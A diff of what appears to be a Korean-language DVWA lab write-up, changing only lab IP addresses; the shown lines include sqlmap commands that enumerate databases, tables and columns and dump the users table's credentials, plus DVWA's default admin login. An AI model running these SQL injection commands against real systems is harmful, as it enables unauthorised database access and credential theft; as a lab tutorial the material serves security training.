@@ -21,8 +21,8 @@ mermaid: true
 
 | 구분 | 내용 |
 |---|---|
-| 공격자 | Kali Linux (192.168.0.10) |
-| 대상 서버 | Ubuntu + DVWA (192.168.0.30/DVWA/) |
+| 공격자 | Kali Linux (192.168.56.10) |
+| 대상 서버 | Ubuntu + DVWA (192.168.56.30/DVWA/) |
 | 도구 | Firefox, SQLmap |
 
 ---
@@ -295,7 +295,7 @@ WHERE table_name='users'--
 
 ### 5.1 Security Level 설정
 
-1. `http://192.168.0.30/DVWA/` 접속
+1. `http://192.168.56.30/DVWA/` 접속
 2. 로그인: `admin` / `password`
 3. 좌측 메뉴 **DVWA Security** → **Low** 선택 → **Submit**
 
@@ -489,7 +489,7 @@ SQLmap은 인증이 필요한 페이지에 접근하기 위해 로그인된 세�
 ### 6.2 Step 1: 취약점 탐지
 
 ```bash
-sqlmap -u "http://192.168.0.30/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
+sqlmap -u "http://192.168.56.30/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
   --cookie="PHPSESSID=<세션ID>; security=low" \
   --batch
 ```
@@ -505,7 +505,7 @@ sqlmap -u "http://192.168.0.30/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
 ### 6.3 Step 2: DB 목록 조회
 
 ```bash
-sqlmap -u "http://192.168.0.30/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
+sqlmap -u "http://192.168.56.30/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
   --cookie="PHPSESSID=<세션ID>; security=low" \
   --dbs --batch
 ```
@@ -522,7 +522,7 @@ available databases [4]:
 ### 6.4 Step 3: 테이블 목록 조회
 
 ```bash
-sqlmap -u "http://192.168.0.30/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
+sqlmap -u "http://192.168.56.30/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
   --cookie="PHPSESSID=<세션ID>; security=low" \
   -D dvwa --tables --batch
 ```
@@ -540,7 +540,7 @@ Database: dvwa
 ### 6.5 Step 4: 컬럼 확인
 
 ```bash
-sqlmap -u "http://192.168.0.30/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
+sqlmap -u "http://192.168.56.30/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
   --cookie="PHPSESSID=<세션ID>; security=low" \
   -D dvwa -T users --columns --batch
 ```
@@ -567,7 +567,7 @@ Table: users
 ### 6.6 Step 5: 데이터 덤프
 
 ```bash
-sqlmap -u "http://192.168.0.30/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
+sqlmap -u "http://192.168.56.30/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
   --cookie="PHPSESSID=<세션ID>; security=low" \
   -D dvwa -T users -C user,password --dump --batch
 ```
@@ -629,7 +629,7 @@ Table: users
 ### 7.3 SQLmap으로 Blind SQLi 자동화
 
 ```bash
-sqlmap -u "http://192.168.0.30/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
+sqlmap -u "http://192.168.56.30/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit" \
   --cookie="PHPSESSID=<세션ID>; security=low" \
   --technique=B \
   --dbs --batch
